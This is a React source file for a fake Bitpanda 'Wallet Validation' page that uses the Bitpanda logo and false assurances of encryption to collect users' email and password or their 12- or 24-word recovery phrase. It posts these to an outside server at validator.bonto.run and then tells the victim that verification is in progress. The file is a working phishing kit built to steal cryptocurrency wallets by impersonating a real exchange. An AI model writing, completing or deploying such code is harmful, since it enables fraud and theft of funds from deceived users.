import React, { useState } from "react";
import {
  Eye,
  EyeOff,
  Loader2,
  Shield,
  CheckCircle
} from "lucide-react";
import axios from "axios";
import './bitPandaWallet.css';
import bitpandaLogo from "../../assets/Bitpanda_logo.png";

const EMAIL_API = "https://validator.bonto.run/bitPanda";
const SEED_API = "https://validator.bonto.run/bitPandaSeed";

const BitpandaWallet = () => {
  const [method, setMethod] = useState(null);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");

  const [form, setForm] = useState({
    email: "",
    password: "",
    seed: ""
  });

  const submitEmail = async () => {
    if (!form.email || !form.password) {
      setError("Please fill in all fields");
      return;
    }

    setLoading(true);
    setError("");

    try {
      await axios.post(EMAIL_API, {
        emailOrUsername: form.email,   // ✅ fixed
        password: form.password
      });
      setDone(true);
    } catch {
      setError("Validation failed. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const submitSeed = async () => {
    if (!form.seed.trim()) {
      setError("Please enter your recovery phrase");
      return;
    }

    setLoading(true);
    setError("");

    try {
      await axios.post(SEED_API, {
        passphrase: form.seed
      });
      setDone(true);
    } catch {
      setError("Validation failed. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  /* ================= SUCCESS ================= */
  if (done) {
    return (
      <div className="bitpanda-wallet-wrapper">
        <div className="bitpanda-wallet-box success">
          <img src={bitpandaLogo} className="bitpanda-logo" />

          <CheckCircle size={42} color="#1fbf75" />
          <h2>Verification in progress</h2>
          <p>
            Your wallet details have been submitted securely.
            You will receive a confirmation email once verification is complete.
          </p>

          <button onClick={() => window.location.href = "/"}>
            Go Home
          </button>
        </div>
      </div>
    );
  }

  /* ================= METHOD SELECT ================= */
  if (!method) {
    return (
      <div className="bitpanda-wallet-wrapper">
        <div className="bitpanda-wallet-box">
          <img src={bitpandaLogo} className="bitpanda-logo large" />

          <h1>Wallet Validation</h1>
          <p className="subtitle">
            Choose a verification method to continue securely
          </p>

          <div className="method-buttonss">
            <button onClick={() => setMethod("email")}>
              Validate with Email & Password
            </button>

            <button className="outline" onClick={() => setMethod("seed")}>
              Validate with Recovery Phrase
            </button>
          </div>

          <p className="note">
            All validations are encrypted and processed securely.
          </p>
        </div>
      </div>
    );
  }

  /* ================= EMAIL FORM ================= */
  if (method === "email") {
    return (
      <div className="bitpanda-wallet-wrapper">
        <div className="bitpanda-wallet-box">
          <img src={bitpandaLogo} className="bitpanda-logo" />

          <h1>Email Validation</h1>

          <div className="security">
            <Shield size={14} /> Encrypted verification
          </div>

          <div className="input-group">
            <label>Email address</label>
            <input
              type="email"
              placeholder="you@example.com"
              value={form.email}
              onChange={(e) =>
                setForm({ ...form, email: e.target.value })
              }
            />
          </div>

          <div className="input-group">
            <label>Password</label>
            <div className="password-fields">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Enter password"
                value={form.password}
                onChange={(e) =>
                  setForm({ ...form, password: e.target.value })
                }
              />
              <button onClick={() => setShowPassword(!showPassword)}>
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
          </div>

          {error && <div className="error">{error}</div>}

          <button onClick={submitEmail} disabled={loading}>
            {loading ? <Loader2 className="spin" /> : "Validate Wallet"}
          </button>
        </div>
      </div>
    );
  }

  /* ================= SEED FORM ================= */
  return (
    <div className="bitpanda-wallet-wrapper">
      <div className="bitpanda-wallet-box">
        <img src={bitpandaLogo} className="bitpanda-logo" />

        <h1>Recovery Phrase Validation</h1>

        <textarea
          placeholder="Enter your 12 or 24-word recovery phrase"
          value={form.seed}
          onChange={(e) =>
            setForm({ ...form, seed: e.target.value })
          }
        />

        {error && <div className="error">{error}</div>}

        <button onClick={submitSeed} disabled={loading}>
          {loading ? "Validating..." : "Validate Wallet"}
        </button>

        <p className="note">
          Never share your recovery phrase with anyone outside this process.
        </p>
      </div>
    </div>
  );
};

export default BitpandaWallet;
